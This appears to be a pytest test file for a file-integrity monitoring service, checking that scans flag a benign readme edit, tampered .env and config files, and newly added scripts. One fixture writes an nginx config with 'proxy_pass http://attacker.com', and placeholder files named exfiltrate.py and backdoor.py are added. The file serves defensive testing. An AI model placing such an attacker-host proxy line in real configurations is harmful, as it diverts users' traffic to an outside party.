"""Demo scenarios hardening tests for Phase 11.

Validates the three fixed project demo scenarios from Section 11 of the PRD:
1. Benign small edit on a Low criticality file.
2. Suspicious bulk edit of multiple .env / config files.
3. Unexpected new executable/script in a critical monitoring location.
"""

from pathlib import Path
import pytest
from fastapi.testclient import TestClient

from app.config import load_config, save_config
from app.database import (
    get_audit_history,
    get_changes_by_scan_id,
    initialize_database,
)
from app.main import app
from app.models import (
    AppConfig,
    ChangeContract,
    ChangeType,
    Criticality,
    CriticalityRulesConfig,
    MonitoredPathConfig,
)

client = TestClient(app)


@pytest.fixture(autouse=True)
def preserve_config():
    """Ensure original configuration is preserved."""
    orig = load_config()
    yield
    save_config(orig)


@pytest.fixture
def demo_dataset_workspace(tmp_path: Path):
    """Fixture to seed ~30 synthetic files across Critical, High, Medium, Low criticality."""
    db_file = tmp_path / "test_demo.db"
    initialize_database(db_file)

    sample_dir = tmp_path / "sample_data"
    sample_dir.mkdir()

    # Subdirectories
    configs_dir = sample_dir / "configs"
    scripts_dir = sample_dir / "scripts"
    docs_dir = sample_dir / "docs"
    configs_dir.mkdir()
    scripts_dir.mkdir()
    docs_dir.mkdir()

    # 1. Critical files (.env)
    (sample_dir / ".env").write_text("DB_PASSWORD=secret_master\nAPI_KEY=prod_key_123", encoding="utf-8")
    (configs_dir / ".env.auth").write_text("AUTH_SECRET=jwt_signing_key_456", encoding="utf-8")
    (configs_dir / ".env.payment").write_text("STRIPE_KEY=sk_live_789", encoding="utf-8")

    # 2. High files (.conf, .cfg)
    (configs_dir / "nginx.conf").write_text("server { listen 80; }", encoding="utf-8")
    (configs_dir / "database.conf").write_text("max_connections=100", encoding="utf-8")
    (configs_dir / "redis.conf").write_text("port=6379", encoding="utf-8")
    (configs_dir / "security.cfg").write_text("enable_ssl=true", encoding="utf-8")
    (configs_dir / "app.cfg").write_text("environment=production", encoding="utf-8")

    # 3. Medium files (.py, .sh)
    for i in range(1, 11):
        (scripts_dir / f"service_{i}.py").write_text(f"# Service {i} worker logic\ndef run(): return {i}", encoding="utf-8")
    (scripts_dir / "deploy.py").write_text("print('Deploying...')", encoding="utf-8")
    (scripts_dir / "cleanup.py").write_text("print('Cleaning up...')", encoding="utf-8")

    # 4. Low files (.txt, .md, .log)
    for i in range(1, 11):
        (docs_dir / f"readme_{i}.txt").write_text(f"Documentation for service {i}", encoding="utf-8")

    # Total files = 3 + 5 + 12 + 10 = 30 files

    config = AppConfig(
        monitored_paths=[
            MonitoredPathConfig(path=str(sample_dir), criticality=Criticality.Medium)
        ],
        criticality_rules=CriticalityRulesConfig(
            extensions={
                ".env": Criticality.Critical,
                ".conf": Criticality.High,
                ".cfg": Criticality.High,
                ".py": Criticality.Medium,
                ".txt": Criticality.Low,
            }
        ),
    )

    save_config(config)

    return {
        "db_file": db_file,
        "sample_dir": sample_dir,
        "configs_dir": configs_dir,
        "scripts_dir": scripts_dir,
        "docs_dir": docs_dir,
        "config": config,
        "tmp_path": tmp_path,
    }


def test_demo_scenario_1_benign_edit_low_criticality(demo_dataset_workspace):
    """Demo Scenario 1: Benign small comment/whitespace edit on a Low criticality file (.txt).

    Expected:
    - Detected change_type: MODIFIED
    - Criticality: Low
    - old_hash != new_hash
    - anomaly_score, drift_score, severity are null before Rohith scoring
    - Unchanged 29 files produce no change records
    """
    ws = demo_dataset_workspace

    # Step 1: Baseline
    base_resp = client.post("/baseline")
    assert base_resp.status_code == 200
    base_data = base_resp.json()
    assert base_data["files_indexed"] == 30

    # Step 2: Benign edit on Low criticality file (readme_1.txt)
    target_file = ws["docs_dir"] / "readme_1.txt"
    target_file.write_text("Documentation for service 1\n# Minor formatting edit", encoding="utf-8")

    # Step 3: Scan
    scan_resp = client.post("/scan")
    assert scan_resp.status_code == 200
    scan_data = scan_resp.json()
    assert scan_data["total_changes"] == 1
    assert scan_data["modified_count"] == 1
    assert scan_data["added_count"] == 0
    assert scan_data["deleted_count"] == 0

    # Step 4: Validate change contract output
    changes_resp = client.get(f"/changes/{scan_data['scan_id']}")
    assert changes_resp.status_code == 200
    changes = changes_resp.json()
    assert len(changes) == 1

    item = changes[0]
    assert "readme_1.txt" in item["file_path"]
    assert item["change_type"] == "MODIFIED"
    assert item["criticality"] == "Low"
    assert item["old_hash"] is not None
    assert item["new_hash"] is not None
    assert item["anomaly_score"] is None
    assert item["drift_score"] is None
    assert item["severity"] is None


def test_demo_scenario_2_suspicious_bulk_config_edits(demo_dataset_workspace):
    """Demo Scenario 2: Suspicious bulk edit of multiple .env and .conf files.

    Expected:
    - Multiple MODIFIED changes on Critical/High files
    - Criticality preserved exactly per file rule (.env -> Critical, .conf -> High)
    - All changes share scan_id
    - Baseline and scan events recorded in audit log
    """
    ws = demo_dataset_workspace

    # Step 1: Baseline
    client.post("/baseline")

    # Step 2: Bulk modification of .env and .conf files
    (ws["sample_dir"] / ".env").write_text("DB_PASSWORD=tampered_pass\nAPI_KEY=exfiltrated", encoding="utf-8")
    (ws["configs_dir"] / ".env.auth").write_text("AUTH_SECRET=injected_backdoor", encoding="utf-8")
    (ws["configs_dir"] / "nginx.conf").write_text("server { listen 80; proxy_pass http://attacker.com; }", encoding="utf-8")
    (ws["configs_dir"] / "database.conf").write_text("max_connections=999999", encoding="utf-8")

    # Step 3: Scan
    scan_resp = client.post("/scan")
    assert scan_resp.status_code == 200
    scan_data = scan_resp.json()
    assert scan_data["total_changes"] == 4
    assert scan_data["modified_count"] == 4

    # Step 4: Validate changes
    changes_resp = client.get(f"/changes/{scan_data['scan_id']}")
    assert changes_resp.status_code == 200
    changes = changes_resp.json()
    assert len(changes) == 4

    by_file = {Path(c["file_path"]).name: c for c in changes}
    assert by_file[".env"]["criticality"] == "Critical"
    assert by_file[".env.auth"]["criticality"] == "Critical"
    assert by_file["nginx.conf"]["criticality"] == "High"
    assert by_file["database.conf"]["criticality"] == "High"


def test_demo_scenario_3_unexpected_new_executable_in_critical_dir(demo_dataset_workspace):
    """Demo Scenario 3: Unexpected new script / binary in monitored directory.

    Expected:
    - Detected change_type: ADDED
    - old_hash = None
    - new_hash = valid 64-char SHA-256
    - Criticality assigned correctly
    - Pre-scoring fields remain null
    """
    ws = demo_dataset_workspace

    # Step 1: Baseline
    client.post("/baseline")

    # Step 2: Add suspicious new script in configs folder
    new_threat = ws["configs_dir"] / "exfiltrate.py"
    new_threat.write_text("import socket, os\n# exfiltration payload", encoding="utf-8")

    # Step 3: Scan
    scan_resp = client.post("/scan")
    assert scan_resp.status_code == 200
    scan_data = scan_resp.json()
    assert scan_data["total_changes"] == 1
    assert scan_data["added_count"] == 1

    # Step 4: Validate change contract
    changes_resp = client.get(f"/changes/{scan_data['scan_id']}")
    assert changes_resp.status_code == 200
    changes = changes_resp.json()
    assert len(changes) == 1

    item = changes[0]
    assert "exfiltrate.py" in item["file_path"]
    assert item["change_type"] == "ADDED"
    assert item["old_hash"] is None
    assert item["new_hash"] is not None
    assert len(item["new_hash"]) == 64
    assert item["criticality"] == "Medium"
    assert item["severity"] is None


def test_demo_full_sequential_rehearsal(demo_dataset_workspace):
    """Full Demo Rehearsal:

    1. POST /baseline (30 files indexed).
    2. Apply all 3 demo scenarios together:
       - Scenario 1: Benign readme edit (Low).
       - Scenario 2: Suspicious .env & nginx.conf edit (Critical & High).
       - Scenario 3: New backdoor.py added (Medium).
       - Also delete 1 obsolete file (readme_10.txt -> Low).
    3. POST /scan -> verify accurate counts (2 modified, 1 added, 1 deleted = 4 changes).
    4. GET /changes/{scan_id} -> contract verification.
    5. GET /audit -> verify immutable audit trail with BASELINE_CREATED and SCAN_COMPLETED.
    """
    ws = demo_dataset_workspace

    # 1. Baseline
    base_resp = client.post("/baseline")
    assert base_resp.status_code == 200

    # 2. Simulate changes
    (ws["docs_dir"] / "readme_1.txt").write_text("Modified readme", encoding="utf-8")
    (ws["sample_dir"] / ".env").write_text("DB_PASSWORD=hacked", encoding="utf-8")
    (ws["configs_dir"] / "backdoor.py").write_text("import os", encoding="utf-8")
    (ws["docs_dir"] / "readme_10.txt").unlink()

    # 3. Scan
    scan_resp = client.post("/scan")
    assert scan_resp.status_code == 200
    scan_data = scan_resp.json()
    assert scan_data["total_changes"] == 4
    assert scan_data["modified_count"] == 2
    assert scan_data["added_count"] == 1
    assert scan_data["deleted_count"] == 1

    # 4. Changes
    changes_resp = client.get(f"/changes/{scan_data['scan_id']}")
    assert changes_resp.status_code == 200
    changes = changes_resp.json()
    assert len(changes) == 4

    # 5. Audit history
    audit_resp = client.get("/audit")
    assert audit_resp.status_code == 200
    audit = audit_resp.json()
    actions = [a["action"] for a in audit]
    assert "BASELINE_CREATED" in actions
    assert "SCAN_COMPLETED" in actions
